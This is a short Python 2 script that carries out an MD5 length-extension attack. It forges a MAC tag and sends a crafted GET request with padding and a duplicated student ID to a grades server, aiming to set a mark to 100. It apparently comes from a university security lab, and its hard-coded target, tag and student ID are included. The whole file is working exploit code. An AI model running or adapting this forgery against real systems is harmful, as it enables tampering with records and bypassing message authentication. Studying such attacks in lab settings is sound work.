import httplib, urlparse, urllib
from md5p import md5, padding

###############
### attack ####
###############

KEY = 11

def attack(url, tag, sid, mark): 
    # parameter url is the attack url you construct
    parsedURL = urlparse.urlparse(url)
    #print parsedURL.path

    # open a connection to the server
    httpconn = httplib.HTTPConnection(parsedURL.hostname, parsedURL.port)

    h = md5(state=tag.decode("hex"),count=512)
    h.update("&sid=1001537483&mark=100")
    illegalTag = h.hexdigest()

    query = parsedURL.path + \
            "?tag=" + illegalTag + \
            "&sid=" + sid + \
            urllib.quote(padding(8 * (15 + KEY))) + \
            "&sid=" + sid + \
            "&mark=" + str(mark)
    #print(query)
    # issue server-API request
    httpconn.request("GET", query)

    # httpresp is response object containing a status value and possible message
    httpresp = httpconn.getresponse()

    # valid request will result in httpresp.status value 200
    print httpresp.status

    # in the case of a valid request, print the server's message
    print httpresp.read()
    
    # return the url that made the attack successul 
    return(query) # dummy code


#############
### main ####
#############

if __name__ == "__main__":
    url = "http://grades.cms-weblab.utsc.utoronto.ca/"
    tag = "384748b103f0901260027373ebbba319"
    sid = "1001537483"
    mark = "100"
    print(attack(url, tag, sid, mark))

